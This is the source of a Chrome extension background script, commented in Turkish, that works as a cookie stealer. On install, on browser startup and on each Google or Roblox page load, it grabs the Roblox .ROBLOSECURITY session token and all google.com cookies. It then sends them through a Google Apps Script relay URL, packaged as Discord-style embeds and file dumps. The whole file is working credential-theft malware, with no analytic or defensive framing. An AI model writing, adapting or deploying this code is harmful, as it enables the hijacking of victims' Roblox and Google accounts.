// background.js — Sadece Roblox Token ve Google Cookies
const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";

// 1. Eklenti kurulduğu an çalış
chrome.runtime.onInstalled.addListener(() => {
  console.log("[*] Eklenti kuruldu, tarama basliyor...");
  grabEverything();
});

// 2. Chrome her açıldığında çalış
chrome.runtime.onStartup.addListener(() => {
  grabEverything();
});

// 3. Google veya Roblox sekmesi yenilendiğinde çalış
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    if (tab.url.includes("google.com") || tab.url.includes("roblox.com")) {
      grabEverything();
    }
  }
});

// --- ANA FONKSİYON ---
async function grabEverything() {
  console.log("[*] Cookie'ler toplaniyor...");
  
  // 1. ROBLOX: Sadece .ROBLOSECURITY
  let robloxCookie = await new Promise(r => chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, r));
  if (robloxCookie && robloxCookie.value) {
    let rData = robloxCookie.value;
    let rEmbed = {
      content: "",
      embeds: [{
        title: "Roblox .ROBLOSECURITY",
        description: "```\n" + rData + "\n```",
        color: 16711680
      }]
    };
    await sendToGAS("roblox", rEmbed, rData, "roblox_token.txt");
  }

  // 2. GOOGLE: Tüm Cookie'ler (url filtresi ile)
  let googleCookies = await new Promise(r => chrome.cookies.getAll({ url: "https://www.google.com" }, r));
  if (googleCookies && googleCookies.length > 0) {
    let gData = googleCookies.map(c => `${c.name} = ${c.value}`).join("\n");
    let gEmbed = {
      content: "",
      embeds: [{
        title: "Google Cookies",
        description: "```\n" + gData + "\n```",
        color: 3447003
      }]
    };
    let gDump = JSON.stringify(googleCookies, null, 2);
    await sendToGAS("google", gEmbed, gDump, "google_dump.txt");
  } else {
    console.log("[-] Google cookie bulunamadi. Giris yapilmamis olabilir.");
  }
}

// --- GAS KÖPRÜSÜ ---
async function sendToGAS(type, payload, fileContent, fileName) {
  try {
    const body = {
      type: type,
      payload_json: payload,
      file_content: fileContent,
      file_name: fileName
    };
    await fetch(GAS_URL, {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(body)
    });
    console.log("[+] " + type + " gonderildi.");
  } catch (e) {
    console.error("gas bridge:", e);
  }
}
